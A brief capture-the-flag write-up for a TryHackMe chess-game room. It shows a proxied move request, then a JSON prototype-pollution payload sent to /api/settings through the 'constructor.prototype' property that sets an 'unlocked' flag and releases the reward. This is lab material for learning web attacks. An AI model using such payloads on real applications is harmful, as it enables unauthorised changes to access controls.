# [Fools Mate Revenge](https://tryhackme.com/room/foolsm8v2)

Capture a mate (move from a1 to a8) request in a proxy and send to replay.

Sending;
```
Content-Length: 23
Cookie: sid=

{
    "from":"a1",
    "to":"a8"
}
```
Results in
```
{
    "ok": true,
    "move": "a1a8",
    "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
    "status": "checkmate",
    "turn": "b",
    "winner": "white",
    "locked": true,
    "message": "Checkmate! No reward for you.",
    "reason": "reward gate closed: session.config.unlocked is not set"
}
```
Locked tells us something there, trying to inject the protype on this endpoint didn't work.

Just felt the need to "Save preferences" out of frustration

And /api/settings was discovered.

After several attempts, prototype pollution worked with the contructor property
```
{
    "constructor":{
        "prototype":{
           "unlocked": true }
           },
    "theme":"flag",
    "pieceSet":"makeup",
    "animationMs":180
}
```
Now, send a move request once more, and we get
```
{
    "ok": true,
    "move": "a1a8",
    "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
    "status": "checkmate",
    "turn": "b",
    "winner": "white",
    "flag": "THM{pr0t0_%&==-=-=-_=+=_=-=-=-}"
}
```

